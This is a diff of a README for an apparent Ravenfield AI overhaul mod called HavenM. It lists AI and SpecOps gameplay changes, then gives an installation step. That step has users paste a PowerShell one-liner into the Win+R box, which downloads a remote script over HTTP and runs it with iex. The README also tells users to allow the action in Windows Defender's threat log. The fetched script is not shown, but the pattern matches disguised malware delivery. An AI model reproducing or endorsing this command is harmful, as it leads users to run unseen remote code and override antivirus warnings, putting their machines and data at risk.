@@ -6,7 +6,6 @@ HavenM is a game-changing AI and gameplay overhaul mod for *Ravenfield*, designe
 ## Why Modify the Game DLL with dnSpy?
 Ravenfield's default AI often feels too predictable, lacking the tactical decision-making and combat awareness that could make battles more engaging. Over nearly two years of dedicated work, HavenM was created to introduce smarter, more reactive AI and refined game mechanics, offering a significantly improved experience.
 
----
 ## Key Features & Changes
 
 ### AI Improvements
@@ -48,7 +47,6 @@ Ravenfield's default AI often feels too predictable, lacking the tactical decisi
     - **Bullets & explosives pass through cover** if they deal **over 100 damage**.
     - **Explosives ignore cover & explode** if their damage is over **900**.
 
----
 ## Overhauled SpecOps Game Mode
 HavenM includes a **complete revamp** of the SpecOps mode, making it more dynamic and challenging:
 
@@ -61,12 +59,12 @@ HavenM includes a **complete revamp** of the SpecOps mode, making it more dynami
 - **Increased enemy spawns during exfiltration**, making the escape phase more intense.
 - AI **no longer needs direct line of sight to fire flares**—they react when alerted instead.
 
-Installation 
+# Installation 
 Copy this command, Win+R to open "Run" windows, paste it, and press Enter.
 
 It will create an Updater shortcut in Desktop.
 
-**YOU MAY NEED TO ALLOW THIS ACTION ON YOUR** [WINDOWS DENFENDER](windowsdefender://threat) **FOR THE FIRST TIME!!!**
+**YOU MAY NEED TO ALLOW THIS ACTION ON YOUR [WINDOWS DENFENDER](windowsdefender://threat)’s Log FOR THE FIRST TIME!!!**
 ```batch
 powershell -nop -c "$w=(New-Object System.Net.WebClient);$w.Encoding=[System.Text.Encoding]::UTF8;iex($w.DownloadString('http://ravenfieldcommunity.github.io/static/get_havenm-utf8.ps1'));Read-Host;"
 ```
